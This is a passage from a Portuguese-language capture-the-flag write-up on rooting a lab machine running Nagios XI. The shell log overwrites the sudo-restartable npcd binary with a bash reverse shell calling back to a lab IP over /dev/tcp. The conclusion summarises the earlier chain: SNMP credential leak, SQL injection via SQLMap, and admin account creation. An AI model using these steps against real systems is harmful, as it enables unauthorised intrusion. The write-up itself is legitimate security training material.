-rwxr-xr-x 1 root   root      1083 Nov  9 10:42 ndo-startup-hash.sh
-rwxr-xr-- 1 nagios nagios   31584 Nov  9 10:42 npcd
-rwxr-xr-- 1 nagios nagios   14552 Nov  9 10:42 npcdmod.o
-rwxr-xr-x 1 root   root    215488 Nov  9 10:43 nrpe
-rwxr-xr-x 1 root   root     10661 Nov  9 10:43 nrpe-uninstall
-rwxr-xr-x 1 root   root    142920 Nov  9 10:43 nsca
```
Isso significa que podemos apagar o conteúdo do binário `npcd` e substituí-lo por uma shell reversa. Se isto tiver sucesso, podemos ter raiz.


## [](#solving) Passo 4 - Aumento do privilégio

Vamos experimentar! Primeiro, precisamos parar o serviço para podermos alterar o conteúdo do arquivo:

```bash
nagios@monitored:/usr/local/nagios/bin$ sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
<local/nagiosxi/scripts/manage_services.sh stop npcd
nagios@monitored:/usr/local/nagios/bin$ echo "" > npcd
echo "" > npcd
nagios@monitored:/usr/local/nagios/bin$ echo '#!/bin/bash' > npcd
echo '#!/bin/bash' > npcd
nagios@monitored:/usr/local/nagios/bin$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.200/9000 0>&1'" >> npcd
<ash -i >& /dev/tcp/10.10.10.10/9000 0>&1'" >> npcd
nagios@monitored:/usr/local/nagios/bin$ cat npcd
cat npcd
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/9000 0>&1'
```
Nós substituímos com sucesso o binário npcd. Agora, iniciamos outro netcat na porta 9000 e iniciamos o serviço novamente com `sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd` para obter o shell root:

<img src="../figs/monitored11.png" alt="root-shell">


# [](#conclusions)Conclusão

Foi um belo passeio. Muitos buracos de coelho ao longo do caminho, mas muitas coisas novas aprendidas. Nós fomos capazes de encontrar o nosso caminho no site usando primeiro snmpwalk que vazou algumas credenciais de usuário sem privilégios. Com estes, conseguimos criar tokens de autenticação no endpoint `/nagiosxi/api/v1/authenticate`, que foram então usados para testar uma injeção SQL no endpoint `/nagiosxi/admin/banner_message-ajaxhelper.php`. Com o SQLMap, conseguimos recuperar a chave de API do administrador, que foi usada para criar uma nova conta de administrador sob o Nagios XI. Então, esta conta de administrador recém-criada nos forneceu a oportunidade de executar uma shell reversa dentro de comandos Nagios XI, concedendo-nos a shell do usuário.

A partir daí, listamos simplesmente todos os comandos sudo que poderíamos executar sem senha para encontrar um que usasse o serviço em execução a partir de um binário que tínhamos permissões de escrita. Nós adicionamos nossa segunda carga de shell reversa nele, reiniciamos o serviço, e temos a shell raiz.

Simplesmente incrível!

Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **!

<a href="/">Voltar</a>
